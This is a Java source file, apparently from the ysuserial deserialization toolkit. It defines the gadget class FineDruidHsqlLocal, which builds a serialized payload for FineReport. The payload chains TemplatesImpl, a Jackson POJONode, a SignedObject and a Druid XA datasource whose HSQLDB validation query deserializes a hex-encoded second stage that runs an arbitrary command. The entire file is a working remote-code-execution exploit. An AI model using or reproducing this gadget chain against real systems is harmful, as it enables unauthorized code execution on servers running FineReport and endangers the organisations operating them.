package org.su18.ysuserial.payloads.gadgets;

import com.fr.json.JSONArray;
import com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;
import com.fr.third.fasterxml.jackson.databind.node.POJONode;
import com.fr.third.springframework.aop.target.HotSwappableTargetSource;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.util.*;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.codec.binary.Hex;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.fr.third.alibaba.druid:x"})
@Authors({Authors.DEMO})
public class FineDruidHsqlLocal implements ObjectPayload<Object> {
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FineDruidHsqlLocal.class, args);
    }
    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);
        try {
            CtClass ctClass = ClassPool.getDefault().get("com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            // 将修改后的CtClass加载至当前线程的上下文类加载器中
            ctClass.toClass();
        }
        catch (Exception e){
        }

        POJONode node = new POJONode(TemplatesUtils.makeTemplatesImplAopProxy(template));
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        TemplatesUtils.setFieldValue(val,"val",node);

        SignedObject s = TemplatesUtils.makeSignedObject(val);
        POJONode node2 = new POJONode(s);

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(node2);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap<Object, Object> hashmap = new HashMap<>();
        TemplatesUtils.setFieldValue(hashmap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, h1, h1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, h2, h2, null));
        TemplatesUtils.setFieldValue(hashmap, "table", tbl);

//        return hashmap;


        byte[] ser = FineUtils.serialize(hashmap);

        DruidXADataSource druidXADataSource = new DruidXADataSource();
        druidXADataSource.setDriverClassName("com.fr.third.org.hsqldb.jdbcDriver");

        String hexpayload = Hex.encodeHexString(ser);
        druidXADataSource.setValidationQuery("call \"com.fr.third.springframework.util.SerializationUtils.deserialize\"(CAST(X'"+hexpayload+"' AS VARBINARY(100000)))");
        // com.fr.third.org.hibernate.internal.util.SerializationHelper.deserialize
        // org.terracotta.modules.ehcache.collections.SerializationHelper#deserialize
        druidXADataSource.setInitialSize(1);
        Reflections.setFieldValue(druidXADataSource,"logWriter",null);
        Reflections.setFieldValue(druidXADataSource,"statLogger",null);
        Reflections.setFieldValue(druidXADataSource,"transactionHistogram",null);
        Reflections.setFieldValue(druidXADataSource,"initedLatch",null);

        druidXADataSource.setUrl("jdbc:hsqldb:mem:mydb");

        ArrayList<Object> list = new ArrayList<>();
        list.add(druidXADataSource);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(list);

        Hashtable hashtable = makeTableTstring(jsonArray);


//        byte[] payload = FineUtils.serialize(hashtable);

//        payload = FineUtils.GzipCompress(payload);

        return hashtable;

    }

    public static Hashtable makeTableTstring(Object o) throws Exception{
        Map tHashMap1 = (Map) Reflections.createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        Map tHashMap2 = (Map) Reflections.createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        tHashMap1.put(o,"yy");
        tHashMap2.put(o,"zZ");
        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
        Reflections.setFieldValue(tHashMap2,"loadFactor",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(tHashMap1,1);
        hashtable.put(tHashMap2,1);

        tHashMap1.put(o, null);
        tHashMap2.put(o, null);
        return hashtable;
    }

}
